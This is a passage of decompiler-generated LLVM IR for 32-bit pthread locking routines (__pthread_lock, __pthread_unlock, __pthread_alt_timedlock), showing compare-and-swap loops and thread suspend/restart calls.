  store i32 %v2_805886c, i32* @ebx, align 4
  store i32 %v0_805881a, i32* @esi, align 4
  ret i32 %v0_805886e

; uselistorder directives
  uselistorder i1 %v15_8058853, { 1, 2, 0 }
  uselistorder i32 %v2_8058853, { 1, 0 }
  uselistorder i32 %v0_8058827, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058869, { 1, 0 }
  uselistorder label %dec_label_pc_8058845, { 1, 0 }
  uselistorder label %dec_label_pc_805883d, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_8058870 = load i32, i32* @edi, align 4
  %v0_8058871 = load i32, i32* @edx, align 4
  store i32 %v0_8058871, i32* @edi, align 4
  %v0_8058873 = load i32, i32* @esi, align 4
  %v0_8058874 = load i32, i32* @ebx, align 4
  %v0_8058875 = load i32, i32* @eax, align 4
  store i32 %v0_8058875, i32* @ebx, align 4
  %v1_805887a = inttoptr i32 %v0_8058875 to i32*
  %v2_805887a = load i32, i32* %v1_805887a, align 4
  %v3_805887a = icmp eq i32 %v2_805887a, 0
  %v1_805887d = icmp eq i1 %v3_805887a, false
  br i1 %v1_805887d, label %dec_label_pc_8058893, label %dec_label_pc_805887f

dec_label_pc_805887f:                             ; preds = %entry
  store i32 0, i32* @ecx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8058888 = load i32, i32* %v1_805887a, align 4
  %v15_8058888 = icmp eq i32 %v2_8058888, 0
  %v22_8058888 = select i1 %v15_8058888, i32 1, i32 %v2_8058888
  store i32 %v22_8058888, i32* %v1_805887a, align 4
  %v1_805888c = zext i1 %v15_8058888 to i32
  %v2_805888c = load i32, i32* %edx.global-to-local, align 4
  %v3_805888c = and i32 %v2_805888c, -256
  %v4_805888c = or i32 %v3_805888c, %v1_805888c
  store i32 %v4_805888c, i32* %edx.global-to-local, align 4
  %v4_805888f = icmp eq i1 %v15_8058888, false
  %v1_8058891 = icmp eq i1 %v4_805888f, false
  br i1 %v1_8058891, label %dec_label_pc_80588f2, label %dec_label_pc_8058893

dec_label_pc_8058893:                             ; preds = %dec_label_pc_805887f, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8058895

dec_label_pc_8058895:                             ; preds = %dec_label_pc_80588c4, %dec_label_pc_80588e2, %dec_label_pc_80588d5.preheader, %dec_label_pc_8058893
  %v0_8058895 = load i32, i32* @ebx, align 4
  %v1_8058895 = inttoptr i32 %v0_8058895 to i32*
  %v2_8058895 = load i32, i32* %v1_8058895, align 4
  store i32 %v2_8058895, i32* @esi, align 4
  %v1_8058897 = urem i32 %v2_8058895, 2
  %v2_8058897 = icmp eq i32 %v1_8058897, 0
  %v1_805889d = icmp eq i1 %v2_8058897, false
  br i1 %v1_805889d, label %dec_label_pc_80588ab, label %dec_label_pc_805889f

dec_label_pc_805889f:                             ; preds = %dec_label_pc_8058895
  store i32 %v2_8058895, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80588bd.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80588bd

dec_label_pc_80588ab:                             ; preds = %dec_label_pc_8058895
  %v0_80588ab = load i32, i32* @edi, align 4
  %v1_80588ab = icmp eq i32 %v0_80588ab, 0
  %v1_80588ad = icmp eq i1 %v1_80588ab, false
  br i1 %v1_80588ad, label %dec_label_pc_80588b6, label %dec_label_pc_80588af

dec_label_pc_80588af:                             ; preds = %dec_label_pc_80588ab
  %v0_80588af = call i32 @thread_self.4()
  store i32 %v0_80588af, i32* @edi, align 4
  br label %dec_label_pc_80588b6

dec_label_pc_80588b6:                             ; preds = %dec_label_pc_80588ab, %dec_label_pc_80588af
  %v0_80588b6 = phi i32 [ %v0_80588ab, %dec_label_pc_80588ab ], [ %v0_80588af, %dec_label_pc_80588af ]
  store i32 %v0_80588b6, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80588bd

dec_label_pc_80588bd:                             ; preds = %dec_label_pc_805889f, %dec_label_pc_80588b6
  %v1_80588c1 = phi i32 [ %v0_80588bd.pre, %dec_label_pc_805889f ], [ %v0_80588b6, %dec_label_pc_80588b6 ]
  %v0_805889f.sink = phi i32 [ %v2_8058895, %dec_label_pc_805889f ], [ %v0_80588b6, %dec_label_pc_80588b6 ]
  %v1_80588a6 = or i32 %v0_805889f.sink, 1
  store i32 %v1_80588a6, i32* %ecx.global-to-local, align 4
  %v1_80588bd = icmp eq i32 %v1_80588c1, 0
  br i1 %v1_80588bd, label %dec_label_pc_80588c4, label %dec_label_pc_80588c1

dec_label_pc_80588c1:                             ; preds = %dec_label_pc_80588bd
  %v0_80588c1 = load i32, i32* @esi, align 4
  %v2_80588c1 = add i32 %v1_80588c1, 12
  %v3_80588c1 = inttoptr i32 %v2_80588c1 to i32*
  store i32 %v0_80588c1, i32* %v3_80588c1, align 4
  %v3_80588c6.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80588c4

dec_label_pc_80588c4:                             ; preds = %dec_label_pc_80588bd, %dec_label_pc_80588c1
  %v3_80588c6 = phi i32 [ %v1_80588a6, %dec_label_pc_80588bd ], [ %v3_80588c6.pre, %dec_label_pc_80588c1 ]
  %v0_80588c4 = load i32, i32* @esi, align 4
  %v0_80588c6 = load i32, i32* @ebx, align 4
  %v1_80588c6 = inttoptr i32 %v0_80588c6 to i32*
  %v2_80588c6 = load i32, i32* %v1_80588c6, align 4
  %v15_80588c6 = icmp eq i32 %v0_80588c4, %v2_80588c6
  %v22_80588c6 = select i1 %v15_80588c6, i32 %v3_80588c6, i32 %v2_80588c6
  store i32 %v22_80588c6, i32* %v1_80588c6, align 4
  %v1_80588ca = zext i1 %v15_80588c6 to i32
  %v2_80588ca = load i32, i32* %ecx.global-to-local, align 4
  %v3_80588ca = and i32 %v2_80588ca, -256
  %v4_80588ca = or i32 %v3_80588ca, %v1_80588ca
  store i32 %v4_80588ca, i32* @ecx, align 4
  %v4_80588cd = icmp eq i1 %v15_80588c6, false
  br i1 %v4_80588cd, label %dec_label_pc_8058895, label %dec_label_pc_80588d1

dec_label_pc_80588d1:                             ; preds = %dec_label_pc_80588c4
  %v0_80588d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80588d1 = icmp eq i32 %v0_80588d1, 0
  %v1_80588d3 = icmp eq i1 %v1_80588d1, false
  br i1 %v1_80588d3, label %dec_label_pc_80588ec.preheader, label %dec_label_pc_80588d5.preheader

dec_label_pc_80588ec.preheader:                   ; preds = %dec_label_pc_80588d1
  %v0_80588ec14 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80588ec15 = add i32 %v0_80588ec14, -1
  store i32 %v1_80588ec15, i32* %ebp.global-to-local, align 4
  %v10_80588ed21 = icmp eq i32 %v0_80588ec14, 0
  %v1_80588f023 = icmp eq i1 %v10_80588ed21, false
  br i1 %v1_80588f023, label %dec_label_pc_80588e5, label %dec_label_pc_80588f2

dec_label_pc_80588d5.preheader:                   ; preds = %dec_label_pc_80588d1
  %v0_80588d5.pre = load i32, i32* @edi, align 4
  store i32 %v0_80588d5.pre, i32* @eax, align 4
  %v2_80588d724 = call i32 @suspend.5(i32 %v0_8058874, i32 %v0_8058873)
  %v0_80588dc25 = load i32, i32* @edi, align 4
  %v1_80588dc26 = add i32 %v0_80588dc25, 12
  %v2_80588dc27 = inttoptr i32 %v1_80588dc26 to i32*
  %v3_80588dc28 = load i32, i32* %v2_80588dc27, align 4
  %v4_80588dc29 = icmp eq i32 %v3_80588dc28, 0
  br i1 %v4_80588dc29, label %dec_label_pc_8058895, label %dec_label_pc_80588e2

dec_label_pc_80588e2:                             ; preds = %dec_label_pc_80588d5.preheader, %dec_label_pc_80588e2
  %v0_80588dc31 = phi i32 [ %v0_80588dc, %dec_label_pc_80588e2 ], [ %v0_80588dc25, %dec_label_pc_80588d5.preheader ]
  %v0_80588e2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80588e2 = add i32 %v0_80588e2, 1
  store i32 %v1_80588e2, i32* %ebp.global-to-local, align 4
  store i32 %v0_80588dc31, i32* @eax, align 4
  %v2_80588d7 = call i32 @suspend.5(i32 %v0_8058874, i32 %v0_8058873)
  %v0_80588dc = load i32, i32* @edi, align 4
  %v1_80588dc = add i32 %v0_80588dc, 12
  %v2_80588dc = inttoptr i32 %v1_80588dc to i32*
  %v3_80588dc = load i32, i32* %v2_80588dc, align 4
  %v4_80588dc = icmp eq i32 %v3_80588dc, 0
  br i1 %v4_80588dc, label %dec_label_pc_8058895, label %dec_label_pc_80588e2

dec_label_pc_80588e5:                             ; preds = %dec_label_pc_80588ec.preheader, %dec_label_pc_80588e5
  %v0_80588e5 = load i32, i32* @edi, align 4
  store i32 %v0_80588e5, i32* @eax, align 4
  %v0_80588e7 = call i32 @restart.3()
  %v0_80588ec = load i32, i32* %ebp.global-to-local, align 4
  %v1_80588ec = add i32 %v0_80588ec, -1
  store i32 %v1_80588ec, i32* %ebp.global-to-local, align 4
  %v10_80588ed = icmp eq i32 %v0_80588ec, 0
  %v1_80588f0 = icmp eq i1 %v10_80588ed, false
  br i1 %v1_80588f0, label %dec_label_pc_80588e5, label %dec_label_pc_80588f2

dec_label_pc_80588f2:                             ; preds = %dec_label_pc_80588ec.preheader, %dec_label_pc_80588e5, %dec_label_pc_805887f
  %v0_80588f9 = phi i32 [ %v2_8058888, %dec_label_pc_805887f ], [ %v0_80588c4, %dec_label_pc_80588ec.preheader ], [ %v0_80588e7, %dec_label_pc_80588e5 ]
  store i32 %v0_8058874, i32* @ebx, align 4
  store i32 %v0_8058873, i32* @esi, align 4
  store i32 %v0_8058870, i32* @edi, align 4
  ret i32 %v0_80588f9

; uselistorder directives
  uselistorder i32 %v0_80588dc, { 1, 0 }
  uselistorder i1 %v15_80588c6, { 1, 2, 0 }
  uselistorder i32 %v2_80588c6, { 1, 0 }
  uselistorder i32 %v0_80588b6, { 1, 0, 2 }
  uselistorder i32 %v2_8058895, { 2, 1, 0, 3 }
  uselistorder i1 %v15_8058888, { 1, 0, 2 }
  uselistorder i32 %v2_8058888, { 0, 2, 1 }
  uselistorder i32 %v0_8058874, { 1, 2, 0 }
  uselistorder i32 %v0_8058873, { 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_80588f2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80588e5, { 1, 0 }
  uselistorder label %dec_label_pc_80588e2, { 1, 0 }
  uselistorder label %dec_label_pc_80588c4, { 1, 0 }
  uselistorder label %dec_label_pc_80588bd, { 1, 0 }
  uselistorder label %dec_label_pc_80588b6, { 1, 0 }
  uselistorder label %dec_label_pc_8058895, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80588fd = load i32, i32* @ebx, align 4
  store i32 %v0_80588fd, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_8058916

dec_label_pc_8058907:                             ; preds = %dec_label_pc_8058916
  %v2_805890b = load i32, i32* %v1_8058916, align 4
  %v15_805890b = icmp eq i32 %v2_805890b, 1
  %v22_805890b = select i1 %v15_805890b, i32 0, i32 %v2_805890b
  store i32 %v22_805890b, i32* %v1_8058916, align 4
  %v1_805890f = zext i1 %v15_805890b to i32
  %v2_805890f = load i32, i32* %edx.global-to-local, align 4
  %v3_805890f = and i32 %v2_805890f, -256
  %v4_805890f = or i32 %v3_805890f, %v1_805890f
  store i32 %v4_805890f, i32* @edx, align 4
  %v4_8058912 = icmp eq i1 %v15_805890b, false
  %v1_8058914 = icmp eq i1 %v4_8058912, false
  br i1 %v1_8058914, label %dec_label_pc_8058993.loopexit, label %dec_label_pc_8058916.backedge

dec_label_pc_8058916.backedge:                    ; preds = %dec_label_pc_8058907, %dec_label_pc_8058952
  %v0_8058916.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8058916

dec_label_pc_8058916:                             ; preds = %dec_label_pc_8058916.backedge, %entry
  %v0_805890b = phi i32 [ %v0_8058916.pre, %dec_label_pc_8058916.backedge ], [ %tmp27, %entry ]
  %v1_8058916 = inttoptr i32 %v0_805890b to i32*
  %v2_8058916 = load i32, i32* %v1_8058916, align 4
  store i32 %v2_8058916, i32* %edx.global-to-local, align 4
  %v9_8058918 = icmp eq i32 %v2_8058916, 1
  br i1 %v9_8058918, label %dec_label_pc_8058907, label %dec_label_pc_805891d

dec_label_pc_805891d:                             ; preds = %dec_label_pc_8058916
  %v1_805891f = and i32 %v2_8058916, -2
  store i32 %v1_805891f, i32* %edi.global-to-local, align 4
  %v1_805894a3 = icmp eq i32 %v1_805891f, 0
  %v1_805894c10 = icmp eq i1 %v1_805894a3, false
  br i1 %v1_805894c10, label %dec_label_pc_8058932, label %dec_label_pc_8058952

dec_label_pc_8058932:                             ; preds = %dec_label_pc_805891d, %dec_label_pc_8058941
  %v0_805894e25 = phi i32 [ %v0_805894e24, %dec_label_pc_8058941 ], [ %v0_805890b, %dec_label_pc_805891d ]
  %v0_805893b = phi i32 [ %v1_8058941, %dec_label_pc_8058941 ], [ %v0_805890b, %dec_label_pc_805891d ]
  %v0_8058941 = phi i32 [ %v1_8058947, %dec_label_pc_8058941 ], [ %v1_805891f, %dec_label_pc_805891d ]
  %stack_var_-32.111 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8058941 ], [ 0, %dec_label_pc_805891d ]
  %v1_8058932 = add i32 %v0_8058941, 24
  %v2_8058932 = inttoptr i32 %v1_8058932 to i32*
  %v3_8058932 = load i32, i32* %v2_8058932, align 4
  %v5_8058939 = icmp slt i32 %v3_8058932, %stack_var_-32.111
  br i1 %v5_8058939, label %dec_label_pc_8058941, label %dec_label_pc_805893b

dec_label_pc_805893b:                             ; preds = %dec_label_pc_8058932
  br label %dec_label_pc_8058941

dec_label_pc_8058941:                             ; preds = %dec_label_pc_8058932, %dec_label_pc_805893b
  %v0_805894e24 = phi i32 [ %v0_805894e25, %dec_label_pc_8058932 ], [ %v0_805893b, %dec_label_pc_805893b ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.111, %dec_label_pc_8058932 ], [ %v3_8058932, %dec_label_pc_805893b ]
  %v1_8058941 = add i32 %v0_8058941, 12
  %v2_8058944 = inttoptr i32 %v1_8058941 to i32*
  %v3_8058944 = load i32, i32* %v2_8058944, align 4
  %v1_8058947 = and i32 %v3_8058944, -2
  %v1_805894a = icmp eq i32 %v1_8058947, 0
  %v1_805894c = icmp eq i1 %v1_805894a, false
  br i1 %v1_805894c, label %dec_label_pc_8058932, label %dec_label_pc_805894e

dec_label_pc_805894e:                             ; preds = %dec_label_pc_8058941
  %v12_805894e = icmp eq i32 %v0_805894e24, %v0_805890b
  %v1_8058950 = icmp eq i1 %v12_805894e, false
  br i1 %v1_8058950, label %dec_label_pc_8058967, label %dec_label_pc_8058952

dec_label_pc_8058952:                             ; preds = %dec_label_pc_805891d, %dec_label_pc_805894e
  %v1_8058952 = add i32 %v1_805891f, 12
  %v2_8058952 = inttoptr i32 %v1_8058952 to i32*
  %v3_8058952 = load i32, i32* %v2_8058952, align 4
  %v1_8058957 = and i32 %v3_8058952, -2
  store i32 %v1_8058957, i32* @ebx, align 4
  %v2_805895a = load i32, i32* %v1_8058916, align 4
  %v15_805895a = icmp eq i32 %v2_8058916, %v2_805895a
  %v22_805895a = select i1 %v15_805895a, i32 %v1_8058957, i32 %v2_805895a
  store i32 %v22_805895a, i32* %v1_8058916, align 4
  %v1_805895e = zext i1 %v15_805895a to i32
  %v2_805895e = load i32, i32* %edx.global-to-local, align 4
  %v3_805895e = and i32 %v2_805895e, -256
  %v4_805895e = or i32 %v3_805895e, %v1_805895e
  store i32 %v4_805895e, i32* %edx.global-to-local, align 4
  %v4_8058961 = icmp eq i1 %v15_805895a, false
  br i1 %v4_8058961, label %dec_label_pc_8058916.backedge, label %dec_label_pc_8058985

dec_label_pc_8058967:                             ; preds = %dec_label_pc_805894e
  %v1_8058967 = inttoptr i32 %v0_805894e24 to i32*
  %v2_8058967 = load i32, i32* %v1_8058967, align 4
  %v1_8058969 = and i32 %v2_8058967, -2
  store i32 %v1_8058969, i32* %edi.global-to-local, align 4
  %v1_805896c = add i32 %v1_8058969, 12
  %v2_805896c = inttoptr i32 %v1_805896c to i32*
  %v3_805896c = load i32, i32* %v2_805896c, align 4
  store i32 %v3_805896c, i32* %v1_8058967, align 4
  br label %dec_label_pc_8058971

dec_label_pc_8058971:                             ; preds = %dec_label_pc_8058971, %dec_label_pc_8058967
  %v0_8058971 = load i32, i32* @ecx, align 4
  %v1_8058971 = inttoptr i32 %v0_8058971 to i32*
  %v2_8058971 = load i32, i32* %v1_8058971, align 4
  store i32 %v2_8058971, i32* %edx.global-to-local, align 4
  %v1_8058977 = and i32 %v2_8058971, -2
  store i32 %v1_8058977, i32* @ebx, align 4
  %v2_805897a = load i32, i32* %v1_8058971, align 4
  %v15_805897a = icmp eq i32 %v2_8058971, %v2_805897a
  %v22_805897a = select i1 %v15_805897a, i32 %v1_8058977, i32 %v2_805897a
  store i32 %v22_805897a, i32* %v1_8058971, align 4
  %v1_805897e = zext i1 %v15_805897a to i32
  %v2_805897e = load i32, i32* %edx.global-to-local, align 4
  %v3_805897e = and i32 %v2_805897e, -256
  %v4_805897e = or i32 %v3_805897e, %v1_805897e
  store i32 %v4_805897e, i32* %edx.global-to-local, align 4
  %v4_8058981 = icmp eq i1 %v15_805897a, false
  br i1 %v4_8058981, label %dec_label_pc_8058971, label %dec_label_pc_8058985

dec_label_pc_8058985:                             ; preds = %dec_label_pc_8058952, %dec_label_pc_8058971
  %v0_8058985 = load i32, i32* %edi.global-to-local, align 4
  %v1_8058985 = add i32 %v0_8058985, 12
  %v2_8058985 = inttoptr i32 %v1_8058985 to i32*
  store i32 0, i32* %v2_8058985, align 4
  %v0_805898c = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805898c, i32* @eax, align 4
  %v0_805898e = call i32 @restart.3()
  br label %dec_label_pc_8058993

dec_label_pc_8058993.loopexit:                    ; preds = %dec_label_pc_8058907
  br label %dec_label_pc_8058993

dec_label_pc_8058993:                             ; preds = %dec_label_pc_8058993.loopexit, %dec_label_pc_8058985
  %v2_8058998 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058998, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i1 %v15_805897a, { 1, 2, 0 }
  uselistorder i32 %v2_805897a, { 1, 0 }
  uselistorder i1 %v15_805895a, { 1, 2, 0 }
  uselistorder i32 %v2_805895a, { 1, 0 }
  uselistorder i32 %v1_8058947, { 1, 0 }
  uselistorder i32 %v1_8058941, { 1, 0 }
  uselistorder i32 %stack_var_-32.111, { 1, 0 }
  uselistorder i32 %v1_805891f, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8058916, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_805890b, { 2, 0, 1, 3 }
  uselistorder i1 %v15_805890b, { 1, 2, 0 }
  uselistorder i32 %v2_805890b, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058985, { 1, 0 }
  uselistorder label %dec_label_pc_8058952, { 1, 0 }
  uselistorder label %dec_label_pc_8058941, { 1, 0 }
  uselistorder label %dec_label_pc_8058932, { 1, 0 }
  uselistorder label %dec_label_pc_8058916.backedge, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_8079c48.603 to i32), i32* @eax, align 4
  %v0_80589a4 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80589a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80589a7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_80589b3 = call i32 @__pthread_acquire(i32 %v0_80589a7)
  %v0_80589b8 = load i32, i32* @global_var_8079c44.604, align 4
  %v1_80589bd = icmp eq i32 %v0_80589b8, 0
  br i1 %v1_80589bd, label %entry.dec_label_pc_80589ca_crit_edge, label %dec_label_pc_80589c1

entry.dec_label_pc_80589ca_crit_edge:             ; preds = %entry
  %v0_80589d4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80589ca

dec_label_pc_80589c1:                             ; preds = %entry
  store i32 %v0_80589b8, i32* @esi, align 4
  %v1_80589c3 = inttoptr i32 %v0_80589b8 to i32*
  %v2_80589c3 = load i32, i32* %v1_80589c3, align 4
  store i32 %v2_80589c3, i32* @global_var_8079c44.604, align 4
  br label %dec_label_pc_80589ca

dec_label_pc_80589ca:                             ; preds = %entry.dec_label_pc_80589ca_crit_edge, %dec_label_pc_80589c1
  %v0_80589d4 = phi i32 [ %v0_80589d4.pre, %entry.dec_label_pc_80589ca_crit_edge ], [ %v0_80589b8, %dec_label_pc_80589c1 ]
  store i32 0, i32* @global_var_8079c48.603, align 8
  %v1_80589d4 = icmp eq i32 %v0_80589d4, 0
  %v1_80589d6 = icmp eq i1 %v1_80589d4, false
  br i1 %v1_80589d6, label %dec_label_pc_80589fe, label %dec_label_pc_80589d8

dec_label_pc_80589d8:                             ; preds = %dec_label_pc_80589ca
  store i32 12, i32* %stack_var_-44, align 4
  %v1_80589dd = call i32 @malloc(i32 12)
  %v1_80589e5 = icmp eq i32 %v1_80589dd, 0
  store i32 %v1_80589dd, i32* @esi, align 4
  %v1_80589e9 = icmp eq i1 %v1_80589e5, false
  br i1 %v1_80589e9, label %dec_label_pc_80589fe, label %dec_label_pc_80589eb

dec_label_pc_80589eb:                             ; preds = %dec_label_pc_80589d8
  %v0_80589ee = load i32, i32* @edi, align 4
  store i32 %v0_80589ee, i32* %stack_var_-44, align 4
  %v3_80589ef = inttoptr i32 %v0_80589ee to i32*
  %v4_80589ef = call i32 @__pthread_alt_lock(i32* %v3_80589ef, i32 %v1_80589dd, i32 %v1_80589dd)
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058a64

dec_label_pc_80589fe:                             ; preds = %dec_label_pc_80589d8, %dec_label_pc_80589ca, %dec_label_pc_8058a19
  %v0_80589fe = load i32, i32* @edi, align 4
  %v1_80589fe = inttoptr i32 %v0_80589fe to i32*
  %v2_80589fe = load i32, i32* %v1_80589fe, align 4
  store i32 %v2_80589fe, i32* @ebx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8058a05 = icmp eq i32 %v2_80589fe, 0
  br i1 %v1_8058a05, label %dec_label_pc_80589fe.dec_label_pc_8058a19_crit_edge, label %dec_label_pc_8058a09

dec_label_pc_80589fe.dec_label_pc_8058a19_crit_edge: ; preds = %dec_label_pc_80589fe
  %v0_8058a19.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058a19

dec_label_pc_8058a09:                             ; preds = %dec_label_pc_80589fe
  %v0_8058a09 = load i32, i32* @ebp, align 4
  %v1_8058a09 = icmp eq i32 %v0_8058a09, 0
  %v1_8058a0b = icmp eq i1 %v1_8058a09, false
  br i1 %v1_8058a0b, label %dec_label_pc_8058a14, label %dec_label_pc_8058a0d

dec_label_pc_8058a0d:                             ; preds = %dec_label_pc_8058a09
  %v0_8058a0d = call i32 @thread_self.4()
  store i32 %v0_8058a0d, i32* @ebp, align 4
  br label %dec_label_pc_8058a14

dec_label_pc_8058a14:                             ; preds = %dec_label_pc_8058a09, %dec_label_pc_8058a0d
  %v0_8058a14 = phi i32 [ %v0_8058a09, %dec_label_pc_8058a09 ], [ %v0_8058a0d, %dec_label_pc_8058a0d ]
  %v1_8058a14 = load i32, i32* @esi, align 4
  %v2_8058a14 = add i32 %v1_8058a14, 4
  %v3_8058a14 = inttoptr i32 %v2_8058a14 to i32*
  store i32 %v0_8058a14, i32* %v3_8058a14, align 4
  %v0_8058a17 = load i32, i32* @esi, align 4
  store i32 %v0_8058a17, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058a19

dec_label_pc_8058a19:                             ; preds = %dec_label_pc_80589fe.dec_label_pc_8058a19_crit_edge, %dec_label_pc_8058a14
  %v0_8058a19 = phi i32 [ %v0_8058a19.pre, %dec_label_pc_80589fe.dec_label_pc_8058a19_crit_edge ], [ %v0_8058a17, %dec_label_pc_8058a14 ]
  %v1_8058a19 = add i32 %v0_8058a19, 8
  %v2_8058a19 = inttoptr i32 %v1_8058a19 to i32*
  store i32 0, i32* %v2_8058a19, align 4
  %v1_8058a20 = load i32, i32* @esi, align 4
  %v2_8058a20 = inttoptr i32 %v1_8058a20 to i32*
  store i32 %v2_80589fe, i32* %v2_8058a20, align 4
  %v0_8058a24 = load i32, i32* @edi, align 4
  %v1_8058a24 = inttoptr i32 %v0_8058a24 to i32*
  %v2_8058a24 = load i32, i32* %v1_8058a24, align 4
  %v3_8058a24 = load i32, i32* %edx.global-to-local, align 4
  %v15_8058a24 = icmp eq i32 %v2_80589fe, %v2_8058a24
  %v22_8058a24 = select i1 %v15_8058a24, i32 %v3_8058a24, i32 %v2_8058a24
  store i32 %v22_8058a24, i32* %v1_8058a24, align 4
  %v1_8058a28 = zext i1 %v15_8058a24 to i32
  %v2_8058a28 = load i32, i32* %edx.global-to-local, align 4
  %v3_8058a28 = and i32 %v2_8058a28, -256
  %v4_8058a28 = or i32 %v3_8058a28, %v1_8058a28
  store i32 %v4_8058a28, i32* %edx.global-to-local, align 4
  %v4_8058a2b = icmp eq i1 %v15_8058a24, false
  br i1 %v4_8058a2b, label %dec_label_pc_80589fe, label %dec_label_pc_8058a2f

dec_label_pc_8058a2f:                             ; preds = %dec_label_pc_8058a19
  br i1 %v1_8058a05, label %dec_label_pc_8058a58, label %dec_label_pc_8058a33

dec_label_pc_8058a33:                             ; preds = %dec_label_pc_8058a2f
  %v0_8058a33 = load i32, i32* @edi, align 4
  %v0_8058a39 = load i32, i32* @ebp, align 4
  store i32 %v0_8058a39, i32* %stack_var_-44, align 4
  %v3_8058a3a = inttoptr i32 %v0_8058a33 to i32*
  %v4_8058a3a = call i32 @__pthread_timedsuspend_new(i32 %arg3, i32* %v3_8058a3a, i32 %v0_8058a33)
  %v1_8058a42 = icmp eq i32 %v4_8058a3a, 0
  %v1_8058a44 = icmp eq i1 %v1_8058a42, false
  br i1 %v1_8058a44, label %dec_label_pc_8058a58, label %dec_label_pc_8058a46

dec_label_pc_8058a46:                             ; preds = %dec_label_pc_8058a33
  %v1_8058a46 = and i32 %v4_8058a3a, -256
  %v2_8058a46 = or i32 %v1_8058a46, 1
  %v0_8058a48 = load i32, i32* @esi, align 4
  %v1_8058a48 = add i32 %v0_8058a48, 8
  %v2_8058a48 = inttoptr i32 %v1_8058a48 to i32*
  %v3_8058a48 = load i32, i32* %v2_8058a48, align 4
  store i32 %v2_8058a46, i32* %v2_8058a48, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8058a4d = icmp eq i32 %v3_8058a48, 0
  br i1 %v1_8058a4d, label %dec_label_pc_8058a64, label %dec_label_pc_8058a51

dec_label_pc_8058a51:                             ; preds = %dec_label_pc_8058a46
  %v0_8058a51 = load i32, i32* @ebp, align 4
  store i32 %v0_8058a51, i32* @eax, align 4
  %v0_8058a53 = load i32, i32* %stack_var_-44, align 4
  %v2_8058a53 = call i32 @suspend.5(i32 %v0_8058a53, i32 %arg3)
  br label %dec_label_pc_8058a58

dec_label_pc_8058a58:                             ; preds = %dec_label_pc_8058a33, %dec_label_pc_8058a2f, %dec_label_pc_8058a51
  %v0_8058a58 = load i32, i32* @esi, align 4
  store i32 %v0_8058a58, i32* @eax, align 4
  %v0_8058a5a = call i32 @wait_node_free()
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058a64

dec_label_pc_8058a64:                             ; preds = %dec_label_pc_8058a46, %dec_label_pc_80589eb, %dec_label_pc_8058a58
  %v0_8058a67 = phi i32 [ 0, %dec_label_pc_8058a46 ], [ 1, %dec_label_pc_80589eb ], [ 1, %dec_label_pc_8058a58 ]
  %v2_8058a69 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058a69, i32* @ebx, align 4
  store i32 %v0_80589a4, i32* @esi, align 4
  ret i32 %v0_8058a67

; uselistorder directives
  uselistorder i1 %v15_8058a24, { 1, 2, 0 }
  uselistorder i32 %v2_8058a24, { 1, 0 }
  uselistorder i32 %v0_80589b8, { 0, 2, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 (i32, i32)* @suspend.5, { 3, 1, 0, 2 }
  uselistorder i32 ()* @thread_self.4, { 2, 0, 1 }
